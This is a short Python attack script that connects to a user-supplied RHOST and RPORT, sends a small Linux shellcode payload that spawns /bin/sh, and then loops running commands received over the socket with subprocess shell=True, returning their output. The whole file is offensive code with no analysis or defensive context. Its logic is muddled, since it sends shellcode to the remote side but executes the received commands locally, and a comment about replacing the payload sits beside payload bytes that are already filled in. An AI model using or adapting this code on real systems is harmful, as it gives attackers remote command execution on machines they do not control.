import socket
import os
import subprocess

# Set the target IP and port
target_ip = input("RHOST: ")
target_port = int(input("RPORT: "))

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target machine
client_socket.connect((target_ip, target_port))

# Replace "reverse_shell_payload" with the actual shellcode
shellcode =  b""
shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shellcode += b"\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"
shellcode += b"\xe1\xb0\x0b\xcd\x80"

# Send the reverse shell payload
client_socket.send(shellcode)

# Get a reverse shell
while True:
    try:
        command = client_socket.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        client_socket.send(b"shell> " + output.stdout)
    except ConnectionResetError:
        print("Connection reset by the target machine.")
        break

# Close the connection
client_socket.close()